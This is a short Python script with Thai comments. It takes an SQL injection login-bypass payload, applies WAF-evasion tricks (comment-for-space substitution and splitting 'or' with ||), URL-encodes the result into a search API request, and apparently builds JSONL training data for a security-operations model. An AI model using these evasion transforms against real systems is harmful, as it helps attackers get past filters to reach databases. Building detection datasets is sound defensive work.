import urllib.parse

# 1. ลิสต์ Payload ที่คุณส่งมา (ตัดมาบางส่วนเพื่อเป็นตัวอย่าง)
raw_payloads = [
    "admin' or '1'='1",
]

def bypass_generator(text):
    # เทคนิค 1: เปลี่ยนช่องว่างเป็น /**/ (ไม่ต้องเคาะ Space เอง)
    processed = text.replace(" ", "/**/")
    
    # เทคนิค 2: หั่นคำว่า 'or' เป็น 'o'||'r' (Double Pipe)
    if "or" in processed:
        processed = processed.replace("or", "'||'or'||'")
        
    return processed

# 2. สร้างไฟล์ JSONL สำหรับเทรน AI (Unsloth)
output_file = "train_data_soc.jsonl"
dataset = []

for p in raw_payloads:
    # แปลงร่าง Payload
    bypassed_p = bypass_generator(p)
    # ทำ URL Encode สำหรับใส่ใน Input
    encoded_uri = f"/api/v1/search?q={urllib.parse.quote(bypassed_p)}"
    
    entry = {
        "input": f"GET {encoded_uri}",
    }
    dataset.append(entry)

print(entry)